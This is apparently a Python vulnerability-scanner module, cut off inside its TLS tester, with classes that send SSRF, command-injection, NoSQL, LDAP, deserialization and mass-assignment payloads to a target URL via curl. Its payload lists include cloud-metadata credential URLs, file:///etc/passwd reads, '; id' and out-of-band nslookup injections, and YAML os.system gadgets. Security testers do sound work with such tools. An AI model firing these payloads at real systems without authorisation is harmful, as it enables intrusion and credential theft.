#!/usr/bin/env python3
"""
OWASP Top 10 Complete Coverage + Advanced Vulnerability Testing Module.
Adds: SSRF active testing, Command Injection, NoSQLi, LDAPi, CORS, DNS Security,
Email Security, Business Logic, Deserialization, API Security deep testing.
"""

from __future__ import annotations
import json
import logging
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from urllib.parse import urlparse

logger = logging.getLogger("owasp-complete")

# --------------------------------------------------------------------------- #
# SSRF Tester — Active Server-Side Request Forgery
# --------------------------------------------------------------------------- #

class SSRFTester:
    """Active SSRF testing with cloud metadata and internal service detection."""

    CLOUD_METADATA_URLS = [
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://169.254.169.254/metadata/v1/",  # DigitalOcean
        "http://169.254.169.254/computeMetadata/v1/",  # GCP
        "http://169.254.169.254/metadata/instance",  # Azure
    ]

    INTERNAL_SERVICES = [
        "http://localhost:22",      # SSH
        "http://localhost:3306",    # MySQL
        "http://localhost:5432",    # PostgreSQL
        "http://localhost:6379",    # Redis
        "http://localhost:27017",   # MongoDB
        "http://localhost:9200",    # Elasticsearch
        "http://localhost:8080",    # Common app
        "http://localhost:8443",    # Common app SSL
        "http://127.0.0.1:22",
        "http://127.0.0.1:3306",
        "http://127.0.0.1:5432",
        "http://127.0.0.1:6379",
        "http://127.0.0.1:27017",
        "http://127.0.0.1:9200",
    ]

    PAYLOADS = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::]:80",
        "http://0.0.0.0:80",
        "http://0177.0.0.1/",  # Octal encoding
        "http://2130706433/",  # Integer encoding of 127.0.0.1
        "http://0x7f.0.0.1/",  # Hex encoding
        "http://127.1/",  # Short form
        "http://127.0.1/",
        "gopher://127.0.0.1:6379/_INFO",
        "gopher://127.0.0.1:9200/_cat/indices",
        "dict://127.0.0.1:11211/stats",
        "file:///etc/passwd",
        "file:///proc/self/environ",
    ]

    def test(self, target, param, url):
        """Active SSRF testing."""
        findings = []
        for payload in self.PAYLOADS:
            test_url = f"{url}?{param}={payload}"
            
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code} %{size_download}", "--max-time", "5", test_url],
                timeout=10,
            )
            
            if rc == 0 and stdout:
                parts = stdout.strip().split()
                if len(parts) == 2:
                    status, size = parts
                    if status == "200" and int(size) > 0:
                        findings.append({
                            "type": "ssrf_possible",
                            "payload": payload,
                            "status": status,
                            "response_size": size,
                            "url": test_url,
                            "severity": "high",
                        })
                    elif status in ["301", "302", "303", "307", "308"]:
                        findings.append({
                            "type": "ssrf_redirect",
                            "payload": payload,
                            "status": status,
                            "url": test_url,
                            "severity": "medium",
                        })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ssrf",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "payloads_tested": len(self.PAYLOADS),
        }


# --------------------------------------------------------------------------- #
# Command Injection Tester
# --------------------------------------------------------------------------- #

class CommandInjectionTester:
    """OS Command Injection testing with multiple techniques."""

    PAYLOADS = [
        # Basic injection
        ("; id", "uid="),
        ("| id", "uid="),
        ("&& id", "uid="),
        ("|| id", "uid="),
        ("`id`", "uid="),
        ("$(id)", "uid="),
        # Time-based
        ("; sleep 5", "time_based"),
        ("| sleep 5", "time_based"),
        ("&& sleep 5", "time_based"),
        # Out-of-band
        ("; nslookup {callback}", "oob"),
        ("| nslookup {callback}", "oob"),
        ("&& nslookup {callback}", "oob"),
        # Encoding bypass
        ("%3Bid", "uid="),
        ("%7Cid", "uid="),
        ("%26%26id", "uid="),
        # Filter bypass
        ("i''d", "uid="),
        ("i\"d", "uid="),
        ("i\\d", "uid="),
        # Windows
        ("| whoami", "whoami"),
        ("&& whoami", "whoami"),
        ("; whoami", "whoami"),
        # Blind with DNS
        ("; dig {callback}", "oob"),
        ("| dig {callback}", "oob"),
    ]

    def test(self, target, param, url):
        """Test for OS command injection."""
        findings = []
        import time

        for payload, indicator in self.PAYLOADS:
            if "{callback}" in payload:
                payload = payload.replace("{callback}", "interactsh.local")

            test_url = f"{url}?{param}={payload}"
            
            # For time-based, measure response time
            if indicator == "time_based":
                start = time.time()
                rc, stdout, _ = _run(
                    ["curl", "-s", "--max-time", "10", test_url],
                    timeout=12,
                )
                elapsed = time.time() - start
                if elapsed >= 4:  # If response took ~5 seconds
                    findings.append({
                        "type": "command_injection_time_based",
                        "payload": payload,
                        "response_time": f"{elapsed:.1f}s",
                        "url": test_url,
                        "severity": "critical",
                    })
            else:
                rc, stdout, _ = _run(
                    ["curl", "-s", "--max-time", "5", test_url],
                    timeout=10,
                )
                if rc == 0 and stdout and indicator in stdout:
                    findings.append({
                        "type": "command_injection",
                        "payload": payload,
                        "indicator": indicator,
                        "response_excerpt": stdout[:500],
                        "url": test_url,
                        "severity": "critical",
                    })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "command_injection",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "payloads_tested": len(self.PAYLOADS),
        }


# --------------------------------------------------------------------------- #
# NoSQL Injection Tester
# --------------------------------------------------------------------------- #

class NoSQLInjectionTester:
    """NoSQL injection testing for MongoDB, CouchDB, etc."""

    PAYLOADS = [
        # MongoDB
        ({"username": {"$gt": ""}, "password": {"$gt": ""}}, "bypass"),
        ({"username": {"$ne": None}, "password": {"$ne": None}}, "bypass"),
        ({"$where": "this.password.length > 0"}, "where_clause"),
        ({"$gt": ""}, "gt_operator"),
        ({"$regex": ".*"}, "regex"),
        ({"$exists": True}, "exists"),
        # JSON-based
        ('{"username": {"$gt": ""}, "password": {"$gt": ""}}', "json_bypass"),
        ('{"$where": "sleep(5000)"}', "where_time"),
        # Array injection
        (["$gt", ""], "array_injection"),
    ]

    def test(self, target, param, url):
        """Test for NoSQL injection."""
        findings = []

        # Test JSON body
        for payload, payload_type in self.PAYLOADS:
            if isinstance(payload, dict):
                json_payload = json.dumps(payload)
            elif isinstance(payload, str):
                json_payload = payload
            else:
                json_payload = json.dumps(payload)

            # Test with JSON content type
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-X", "POST",
                    "-H", "Content-Type: application/json",
                    "-d", json_payload,
                    "--max-time", "10",
                    url,
                ],
                timeout=15,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["success", "true", "admin", "user", "found"]):
                    findings.append({
                        "type": "nosql_injection",
                        "payload_type": payload_type,
                        "payload": json_payload[:200],
                        "response_excerpt": stdout[:300],
                        "severity": "high",
                    })

            # Test with URL parameter
            test_url = f"{url}?{param}={json_payload}"
            rc, stdout, _ = _run(
                ["curl", "-s", "--max-time", "10", test_url],
                timeout=15,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["success", "true", "admin", "user"]):
                    findings.append({
                        "type": "nosql_injection_param",
                        "payload_type": payload_type,
                        "url": test_url,
                        "severity": "high",
                    })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "nosql_injection",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# LDAP Injection Tester
# --------------------------------------------------------------------------- #

class LDAPInjectionTester:
    """LDAP injection testing for directory services."""

    PAYLOADS = [
        ("*)(&", "wildcard"),
        ("*)(|(&", "wildcard_or"),
        ("admin)(|(", "admin_bypass"),
        ("admin)(!()", "admin_not"),
        ("*()|&'", "all_filter"),
        ("*()|'", "all_filter2"),
        ("admin*", "admin_wildcard"),
        ("admin*)((|", "admin_bypass2"),
        ("x*y", "xy_wildcard"),
        ("*", "single_wildcard"),
        ("admin)(&)", "admin_and"),
        ("admin)(|(%3d)", "admin_equals"),
    ]

    def test(self, target, param, url):
        """Test for LDAP injection."""
        findings = []

        for payload, payload_type in self.PAYLOADS:
            test_url = f"{url}?{param}={payload}"
            rc, stdout, _ = _run(
                ["curl", "-s", "--max-time", "10", test_url],
                timeout=15,
            )
            if rc == 0 and stdout:
                # LDAP injection often reveals data or changes response
                if any(indicator in stdout.lower() for indicator in ["cn=", "dn=", "uid=", "mail=", "objectclass", "admin", "success"]):
                    findings.append({
                        "type": "ldap_injection",
                        "payload_type": payload_type,
                        "payload": payload,
                        "response_excerpt": stdout[:300],
                        "severity": "high",
                    })

        return {
            "target": target,
            "param": param,
            "url": url,
            "type": "ldap_injection",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# CORS Misconfiguration Tester
# --------------------------------------------------------------------------- #

class CORSTester:
    """CORS (Cross-Origin Resource Sharing) misconfiguration testing."""

    def test(self, target, url):
        """Test for CORS misconfigurations."""
        findings = []
        
        # Test various Origin headers
        test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "null",
            "https://target.com.evil.com",
            "https://evil-target.com",
            "http://localhost",
            "https://127.0.0.1",
            "https://target.com%60.evil.com",
            "https://target.com%00evil.com",
        ]

        for origin in test_origins:
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-I",
                    "-H", f"Origin: {origin}",
                    "--max-time", "5",
                    url,
                ],
                timeout=10,
            )
            
            if rc == 0 and stdout:
                # Check if Access-Control-Allow-Origin reflects the origin
                for line in stdout.split("\n"):
                    if "access-control-allow-origin" in line.lower():
                        acao_value = line.split(":", 1)[1].strip()
                        if acao_value == origin:
                            findings.append({
                                "type": "cors_reflected_origin",
                                "origin": origin,
                                "acao_value": acao_value,
                                "severity": "medium",
                                "url": url,
                            })
                        elif acao_value == "*":
                            findings.append({
                                "type": "cors_wildcard",
                                "origin": origin,
                                "acao_value": "*",
                                "severity": "medium",
                                "url": url,
                            })
                        break
                
                # Check if credentials are allowed with wildcard
                for line in stdout.split("\n"):
                    if "access-control-allow-credentials" in line.lower():
                        if "true" in line.lower():
                            # Check if ACAO is wildcard with credentials
                            for line2 in stdout.split("\n"):
                                if "access-control-allow-origin" in line2.lower():
                                    acao = line2.split(":", 1)[1].strip()
                                    if acao == "*":
                                        findings.append({
                                            "type": "cors_credentials_wildcard",
                                            "severity": "high",
                                            "note": "Access-Control-Allow-Origin: * with Allow-Credential: true",
                                            "url": url,
                                        })

        return {
            "target": target,
            "url": url,
            "type": "cors",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# DNS Security Tester
# --------------------------------------------------------------------------- #

class DNSSecurityTester:
    """DNS security testing — zone transfer, rebinding, cache poisoning."""

    def test(self, target, domain):
        """Test DNS security configurations."""
        findings = []
        
        # Check for zone transfer
        ns_records = _run(["dig", "NS", "+short", domain], timeout=10)
        if ns_records[0] == 0 and ns_records[1]:
            nameservers = [ns.strip() for ns in ns_records[1].strip().split("\n") if ns.strip()]
            for ns in nameservers[:3]:
                rc, stdout, _ = _run(
                    ["dig", f"@{ns}", domain, "AXFR"],
                    timeout=15,
                )
                if rc == 0 and stdout and "XFR" in stdout:
                    findings.append({
                        "type": "dns_zone_transfer",
                        "nameserver": ns,
                        "severity": "high",
                        "note": f"Zone transfer allowed from {ns}",
                    })

        # Check for DNSSEC
        rc, stdout, _ = _run(["dig", domain, "DNSKEY", "+short"], timeout=10)
        if rc == 0 and not stdout.strip():
            findings.append({
                "type": "dns_no_dnssec",
                "severity": "low",
                "note": "DNSSEC not enabled for domain",
            })

        # Check for SPF record
        rc, stdout, _ = _run(["dig", domain, "TXT", "+short"], timeout=10)
        if rc == 0 and stdout:
            if "v=spf1" not in stdout:
                findings.append({
                    "type": "dns_no_spf",
                    "severity": "medium",
                    "note": "No SPF record found — email spoofing possible",
                })
            if "DMARC" not in stdout:
                findings.append({
                    "type": "dns_no_dmarc",
                    "severity": "medium",
                    "note": "No DMARC record found — email spoofing possible",
                })

        # Check for subdomain takeover (CNAME to unregistered services)
        rc, stdout, _ = _run(["dig", f"*.{domain}", "CNAME", "+short"], timeout=10)
        if rc == 0 and stdout:
            takeover_targets = [
                "herokuapp.com", "herokudns.com", "cloudfront.net",
                "s3.amazonaws.com", "azurewebsites.net", "blob.core.windows.net",
                "ghost.io", "shopify.com", "fastly.net", "github.io",
                "surge.sh", "bitbucket.io", "pantheonsite.io", "zendesk.com",
                "teamwork.com", "helpjuice.com", "helpscoutdocs.com",
            ]
            for target_domain in takeover_targets:
                if target_domain in stdout.lower():
                    findings.append({
                        "type": "subdomain_takeover_possible",
                        "cname_target": target_domain,
                        "severity": "high",
                        "note": f"CNAME to {target_domain} — check if service is claimed",
                    })

        return {
            "target": target,
            "domain": domain,
            "type": "dns_security",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# Email Security Tester
# --------------------------------------------------------------------------- #

class EmailSecurityTester:
    """Email security testing — SPF, DKIM, DMARC, SMTP."""

    def test(self, target, domain):
        """Test email security configurations."""
        findings = []

        # Check SPF
        rc, stdout, _ = _run(["dig", domain, "TXT", "+short"], timeout=10)
        if rc == 0 and stdout:
            txt_records = stdout.strip().split("\n")
            
            spf_found = any("v=spf1" in r for r in txt_records)
            if not spf_found:
                findings.append({
                    "type": "email_no_spf",
                    "severity": "medium",
                    "note": "No SPF record — domain can be spoofed",
                })
            else:
                # Check for weak SPF
                for r in txt_records:
                    if "v=spf1" in r:
                        if "+all" in r or "~all" not in r and "-all" not in r:
                            findings.append({
                                "type": "email_weak_spf",
                                "severity": "medium",
                                "note": f"SPF record allows unauthorized senders: {r}",
                            })

            # Check DMARC
            dmarc_found = any("_dmarc" in r or "v=DMARC1" in r for r in txt_records)
            if not dmarc_found:
                # Try _dmarc subdomain
                rc2, stdout2, _ = _run(["dig", f"_dmarc.{domain}", "TXT", "+short"], timeout=10)
                if rc2 == 0 and stdout2 and "v=DMARC1" in stdout2:
                    dmarc_found = True
                else:
                    findings.append({
                        "type": "email_no_dmarc",
                        "severity": "medium",
                        "note": "No DMARC record — email spoofing not prevented",
                    })

            # Check DKIM
            rc3, stdout3, _ = _run(["dig", f"default._domainkey.{domain}", "TXT", "+short"], timeout=10)
            if rc3 == 0 and not stdout3.strip():
                findings.append({
                    "type": "email_no_dkim",
                    "severity": "low",
                    "note": "No DKIM record found — email integrity not verified",
                })

        # Check for open mail relay
        rc, stdout, _ = _run(["dig", domain, "MX", "+short"], timeout=10)
        if rc == 0 and stdout:
            mx_records = [r.strip() for r in stdout.strip().split("\n") if r.strip()]
            if not mx_records:
                findings.append({
                    "type": "email_no_mx",
                    "severity": "info",
                    "note": "No MX records — domain does not receive email",
                })

        return {
            "target": target,
            "domain": domain,
            "type": "email_security",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# Business Logic Tester
# --------------------------------------------------------------------------- #

class BusinessLogicTester:
    """Business logic vulnerability testing."""

    def test(self, target, url, logic_type="price_manipulation"):
        """Test for business logic flaws."""
        findings = []

        if logic_type == "price_manipulation":
            # Test negative prices
            test_payloads = [
                {"price": -1, "quantity": 1},
                {"price": 0, "quantity": 1},
                {"price": 0.01, "quantity": 1},
                {"discount": 100, "quantity": 1},
                {"discount": 200, "quantity": 1},
                {"coupon": "TEST100", "quantity": 1},
                {"quantity": -1, "price": 100},
                {"quantity": 999999, "price": 1},
            ]
            for payload in test_payloads:
                rc, stdout, _ = _run(
                    [
                        "curl", "-s", "-X", "POST",
                        "-H", "Content-Type: application/json",
                        "-d", json.dumps(payload),
                        "--max-time", "10",
                        url,
                    ],
                    timeout=15,
                )
                if rc == 0 and stdout:
                    if any(indicator in stdout.lower() for indicator in ["success", "order", "confirmed", "total"]):
                        findings.append({
                            "type": "price_manipulation",
                            "payload": payload,
                            "response_excerpt": stdout[:300],
                            "severity": "high",
                        })

        elif logic_type == "workflow_bypass":
            # Test skipping steps in multi-step workflows
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-X", "POST",
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps({"step": "complete", "skip": True}),
                    "--max-time", "10",
                    url,
                ],
                timeout=15,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["success", "complete", "confirmed"]):
                    findings.append({
                        "type": "workflow_bypass",
                        "note": "Workflow step may be skippable",
                        "severity": "medium",
                    })

        elif logic_type == "rate_limit_bypass":
            # Test rate limit bypass via headers
            bypass_headers = [
                {"X-Forwarded-For": "1.2.3.4"},
                {"X-Real-IP": "1.2.3.4"},
                {"X-Originating-IP": "1.2.3.4"},
                {"X-Remote-IP": "1.2.3.4"},
                {"X-Client-IP": "1.2.3.4"},
                {"True-Client-IP": "1.2.3.4"},
                {"CF-Connecting-IP": "1.2.3.4"},
            ]
            for header in bypass_headers:
                for _ in range(5):
                    rc, stdout, _ = _run(
                        [
                            "curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                            "-H", f"{list(header.keys())[0]}: {list(header.values())[0]}",
                            "--max-time", "3",
                            url,
                        ],
                        timeout=5,
                    )
                    if rc == 0 and stdout.strip() == "429":
                        break
                else:
                    # If we never got 429, rate limit might be bypassable
                    findings.append({
                        "type": "rate_limit_bypass",
                        "header": list(header.keys())[0],
                        "severity": "medium",
                    })

        return {
            "target": target,
            "url": url,
            "type": f"business_logic_{logic_type}",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# Deserialization Tester
# --------------------------------------------------------------------------- #

class DeserializationTester:
    """Insecure deserialization testing."""

    PAYLOADS = {
        "java": [
            # Java serialized object magic bytes
            b"\xac\xed\x00\x05",
            # Common Java gadget chains
            r'{"@type":"java.net.InetAddress","val":"attacker.com"}',
            r'rO0ABNyYXc=',
        ],
        "python": [
            # Python pickle
            b"\x80\x04\x95",
            # YAML unsafe load
            b"!!python/object/apply:os.system ['id']",
            b"!!python/object/new:os.system ['id']",
        ],
        "php": [
            # PHP serialized data
            b'O:8:"stdClass":1:{s:4:"test";s:3:"pwn";}',
            # PHP object injection
            b'O:1:"R":1:{s:4:"test";s:3:"pwn";}',
        ],
        "dotnet": [
            # .NET LosFormatter
            r'AAEAAAD/////AQAAAAAAAAAMAgAAAF5TeX...',
            # .NET BinaryFormatter
            r'AAAAAAA...',
        ],
    }

    def test(self, target, url, language="auto"):
        """Test for insecure deserialization."""
        findings = []

        if language == "auto":
            languages = ["java", "python", "php", "dotnet"]
        else:
            languages = [language]

        for lang in languages:
            for payload in self.PAYLOADS.get(lang, []):
                if isinstance(payload, bytes):
                    # Write binary payload to temp file
                    tmp = tempfile.NamedTemporaryFile(delete=False)
                    tmp.write(payload)
                    tmp.close()
                    
                    rc, stdout, _ = _run(
                        [
                            "curl", "-s", "-X", "POST",
                            "-H", "Content-Type: application/octet-stream",
                            "--data-binary", f"@{tmp.name}",
                            "--max-time", "10",
                            url,
                        ],
                        timeout=15,
                    )
                    os.unlink(tmp.name)
                else:
                    rc, stdout, _ = _run(
                        [
                            "curl", "-s", "-X", "POST",
                            "-H", "Content-Type: application/json",
                            "-d", payload,
                            "--max-time", "10",
                            url,
                        ],
                        timeout=15,
                    )

                if rc == 0 and stdout:
                    if any(indicator in stdout.lower() for indicator in ["error", "exception", "stack trace", "traceback", "serialize", "unserialize"]):
                        findings.append({
                            "type": "deserialization_detected",
                            "language": lang,
                            "indicator": "error_response",
                            "severity": "medium",
                        })
                    elif any(indicator in stdout.lower() for indicator in ["uid=", "root:", "admin"]):
                        findings.append({
                            "type": "deserialization_rce",
                            "language": lang,
                            "severity": "critical",
                        })

        return {
            "target": target,
            "url": url,
            "type": "deserialization",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# API Security Deep Tester
# --------------------------------------------------------------------------- #

class APISecurityDeepTester:
    """Deep API security testing — mass assignment, BOLA, pagination, etc."""

    def test(self, target, url):
        """Comprehensive API security testing."""
        findings = []

        # Test for mass assignment
        mass_assignment_payloads = [
            {"role": "admin"},
            {"is_admin": True},
            {"admin": True},
            {"permissions": ["admin", "superuser"]},
            {"verified": True},
            {"email_verified": True},
            {"account_type": "premium"},
            {"subscription": "enterprise"},
        ]
        for payload in mass_assignment_payloads:
            rc, stdout, _ = _run(
                [
                    "curl", "-s", "-X", "POST",
                    "-H", "Content-Type: application/json",
                    "-d", json.dumps(payload),
                    "--max-time", "10",
                    url,
                ],
                timeout=15,
            )
            if rc == 0 and stdout:
                if any(indicator in stdout.lower() for indicator in ["success", "updated", "saved", "created"]):
                    findings.append({
                        "type": "mass_assignment",
                        "payload": payload,
                        "severity": "high",
                    })

        # Test for excessive data exposure
        rc, stdout, _ = _run(
            ["curl", "-s", "--max-time", "10", url],
            timeout=15,
        )
        if rc == 0 and stdout:
            sensitive_fields = ["password", "secret", "token", "api_key", "credit_card", "ssn", "social_security"]
            for field in sensitive_fields:
                if field in stdout.lower():
                    findings.append({
                        "type": "excessive_data_exposure",
                        "field": field,
                        "severity": "medium",
                    })

        # Test for missing rate limiting on API
        for _ in range(10):
            rc, stdout, _ = _run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "3", url],
                timeout=5,
            )
            if rc == 0 and stdout.strip() == "429":
                break
        else:
            findings.append({
                "type": "api_no_rate_limit",
                "severity": "medium",
                "note": "No rate limiting detected after 10 rapid requests",
            })

        # Test for CORS on API
        rc, stdout, _ = _run(
            [
                "curl", "-s", "-I",
                "-H", "Origin: https://evil.com",
                "--max-time", "5",
                url,
            ],
            timeout=10,
        )
        if rc == 0 and stdout:
            for line in stdout.split("\n"):
                if "access-control-allow-origin" in line.lower():
                    acao = line.split(":", 1)[1].strip()
                    if acao == "*" or "evil.com" in acao:
                        findings.append({
                            "type": "api_cors_misconfig",
                            "acao": acao,
                            "severity": "medium",
                        })

        return {
            "target": target,
            "url": url,
            "type": "api_security_deep",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# Security Headers Tester
# --------------------------------------------------------------------------- #

class SecurityHeadersTester:
    """Security headers testing — comprehensive header analysis."""

    REQUIRED_HEADERS = {
        "Strict-Transport-Security": {
            "description": "HSTS — forces HTTPS",
            "severity": "medium",
            "check": lambda v: "max-age" in v and int(re.search(r"max-age=(\d+)", v).group(1)) >= 31536000 if re.search(r"max-age=(\d+)", v) else False,
        },
        "Content-Security-Policy": {
            "description": "CSP — prevents XSS",
            "severity": "medium",
            "check": lambda v: "unsafe-inline" not in v and "unsafe-eval" not in v,
        },
        "X-Content-Type-Options": {
            "description": "Prevents MIME sniffing",
            "severity": "low",
            "check": lambda v: v.lower() == "nosniff",
        },
        "X-Frame-Options": {
            "description": "Clickjacking protection",
            "severity": "low",
            "check": lambda v: v.upper() in ["DENY", "SAMEORIGIN"],
        },
        "X-XSS-Protection": {
            "description": "Legacy XSS filter",
            "severity": "info",
            "check": lambda v: "1" in v,
        },
        "Referrer-Policy": {
            "description": "Controls referrer information",
            "severity": "low",
            "check": lambda v: v.lower() in ["no-referrer", "strict-origin", "strict-origin-when-cross-origin"],
        },
        "Permissions-Policy": {
            "description": "Feature policy",
            "severity": "low",
            "check": lambda v: len(v) > 0,
        },
        "Cross-Origin-Opener-Policy": {
            "description": "COOP — cross-origin isolation",
            "severity": "low",
            "check": lambda v: v.lower() == "same-origin",
        },
        "Cross-Origin-Resource-Policy": {
            "description": "CORP — cross-origin resource protection",
            "severity": "low",
            "check": lambda v: v.lower() in ["same-origin", "same-site"],
        },
    }

    DANGEROUS_HEADERS = [
        "Server",
        "X-Powered-By",
        "X-AspNet-Version",
        "X-AspNetMvc-Version",
    ]

    def test(self, target, url):
        """Test security headers."""
        findings = []
        headers_found = {}

        rc, stdout, _ = _run(
            ["curl", "-s", "-I", "--max-time", "10", url],
            timeout=15,
        )
        if rc == 0 and stdout:
            for line in stdout.split("\n"):
                if ":" in line:
                    key, _, value = line.partition(":")
                    headers_found[key.strip().lower()] = value.strip()

        # Check required headers
        for header, config in self.REQUIRED_HEADERS.items():
            header_lower = header.lower()
            if header_lower not in headers_found:
                findings.append({
                    "type": "missing_security_header",
                    "header": header,
                    "description": config["description"],
                    "severity": config["severity"],
                })
            else:
                value = headers_found[header_lower]
                if not config["check"](value):
                    findings.append({
                        "type": "weak_security_header",
                        "header": header,
                        "value": value,
                        "description": config["description"],
                        "severity": config["severity"],
                    })

        # Check for dangerous headers
        for header in self.DANGEROUS_HEADERS:
            if header.lower() in headers_found:
                findings.append({
                    "type": "information_disclosure",
                    "header": header,
                    "value": headers_found[header.lower()],
                    "severity": "low",
                })

        return {
            "target": target,
            "url": url,
            "type": "security_headers",
            "vulnerable": len(findings) > 0,
            "findings": findings,
            "headers_found": {k: v[:100] for k, v in headers_found.items()},
        }


# --------------------------------------------------------------------------- #
# Subdomain Takeover Tester
# --------------------------------------------------------------------------- #

class SubdomainTakeoverTester:
    """Subdomain takeover detection."""

    VULNERABLE_CNAME_TARGETS = {
        "herokuapp.com": "Heroku",
        "herokudns.com": "Heroku",
        "cloudfront.net": "AWS CloudFront",
        "s3.amazonaws.com": "AWS S3",
        "s3-website": "AWS S3",
        "azurewebsites.net": "Azure App Service",
        "blob.core.windows.net": "Azure Blob",
        "azure-api.net": "Azure API Management",
        "trafficmanager.net": "Azure Traffic Manager",
        "ghost.io": "Ghost",
        "myshopify.com": "Shopify",
        "fastly.net": "Fastly",
        "github.io": "GitHub Pages",
        "githubusercontent.com": "GitHub",
        "surge.sh": "Surge",
        "bitbucket.io": "Bitbucket",
        "pantheonsite.io": "Pantheon",
        "zendesk.com": "Zendesk",
        "teamwork.com": "Teamwork",
        "helpjuice.com": "HelpJuice",
        "helpscoutdocs.com": "HelpScout",
        "freshdesk.com": "Freshdesk",
        "tilda.ws": "Tilda",
        "campaignmonitor.com": "Campaign Monitor",
        "cargocollective.com": "Cargo",
        "statuspage.io": "Statuspage",
        "amazonaws.com": "AWS",
        "elasticbeanstalk.com": "AWS Elastic Beanstalk",
        "1e100.net": "Google Cloud",
    }

    def test(self, target, domain):
        """Test for subdomain takeover."""
        findings = []

        # Use subfinder to get subdomains
        subfinder = shutil.which("subfinder") or str(Path.home() / "go" / "bin" / "subfinder")
        if subfinder:
            rc, stdout, _ = _run(
                [subfinder, "-d", domain, "-silent"],
                timeout=60,
            )
            if rc == 0 and stdout:
                subdomains = [s.strip() for s in stdout.strip().split("\n") if s.strip()]

                for subdomain in subdomains[:50]:
                    # Check CNAME
                    rc2, stdout2, _ = _run(
                        ["dig", "CNAME", f"{subdomain}.", "+short"],
                        timeout=10,
                    )
                    if rc2 == 0 and stdout2:
                        cname = stdout2.strip()
                        for target_domain, service in self.VULNERABLE_CNAME_TARGETS.items():
                            if target_domain in cname:
                                findings.append({
                                    "type": "subdomain_takeover",
                                    "subdomain": subdomain,
                                    "cname": cname,
                                    "service": service,
                                    "severity": "high",
                                    "note": f"CNAME to {service} — verify if service is claimed",
                                })

        return {
            "target": target,
            "domain": domain,
            "type": "subdomain_takeover",
            "vulnerable": len(findings) > 0,
            "findings": findings,
        }


# --------------------------------------------------------------------------- #
# TLS/SSL Security Tester (A02: Cryptographic Failures)
# --------------------------------------------------------------------------- #

class TLSSecurityTester:
    """TLS/SSL security testing — protocols, ciphers, certificates."""

    WEAK_CIPHERS = [
        "RC4", "DES", "3DES", "MD5", "NULL", "EXPORT", "anon",
    ]
    WEAK_PROTOCOLS = ["SSLv2", "SSLv3", "TLSv1.0", "TLSv1.1"]

    def test(self, target, domain, port=443):
        """Test TLS/SSL security configuration."""
        findings = []

        # Test SSL/TLS with openssl
        sslscan = shutil.which("sslscan")
        if sslscan:
            rc, stdout, _ = _run(
                [sslscan, f"{domain}:{port}"],
                timeout=30,
            )
            if rc == 0 and stdout:
                # Check for weak protocols
                for protocol in self.WEAK_PROTOCOLS:
                    if protocol.lower() in stdout.lower() and "enabled" in stdout.lower():
                        findings.append({
                            "type": "tls_weak_protocol",
                            "protocol": protocol,
                            "severity": "high",
                            "note": f"Weak protocol {protocol} is enabled",
                        })

                # Check for weak ciphers
                for cipher in self.WEAK_CIPHERS:
                    if cipher.lower() in stdout.lower():
                        findings.append({
                            "type": "tls_weak_cipher",
                            "cipher": cipher,
                            "severity": "medium",
                        })

                # Check certificate
                if "issuer:" in stdout.lower():
                    # Extract issuer
                    for line in stdout.split("\n"):
                        if "issuer:" in line.lower():
                            findings.append({
                                "type": "tls_certificate",
                                "issuer": line.strip(),
                                "severity": "info",
                            })
                            break
        else:
            # Fallback: use openssl s_client
            rc, stdout, _ = _run(
                ["bash", "-c", f"echo | openssl s_client -connect {domain}:{port} -tls1_2 2>&1"],
                timeout=15,
            )
            if rc == 0 and stdout:
                # Check certificate expiry
                rc2, stdout2, _ = _run(
                    ["bash", "-c", f"echo | openssl s_client -connect {domain}:{port} 2>/dev/null | openssl x509 -noout -dates"],
                    timeout=15,
                )
                if rc2 == 0 and stdout2:
                    for line in stdout2.split("\n"):
                        if "notAfter" in line:
                            findings.append({
                                "type": "tls_cert_expiry",
                                "info": line.strip(),
                                "severity": "info",
                            })

                # Check for TLS 1.0/1.1
                for protocol in ["-tls1", "-tls1_1"]:
                    rc3, stdout3, _ = _run(
                        ["bash", "-c", f"echo | openssl s_client -connect {domain}:{port} {protocol} 2>&1"],
                        timeout=10,
                    )
                    if rc3 == 0 and stdout3 and "verify return code: 0" in stdout3:
                        findings.append({
                            "type": "tls_weak_protocol",
                            "protocol": protocol.replace("-", "").replace("_", "."),
                            "severity": "high",
                        })

        # Test for HSTS
        rc, stdout, _ = _run(
            ["curl", "-s", "-I", "--max-time", "10", f"https://{domain}"],
            timeout=15,
        )
        if rc == 0 and stdout:
            hsts_found = False
            for line in stdout.split("\n"):
                if "strict-transport-security" in line.lower():
                    hsts_found = True
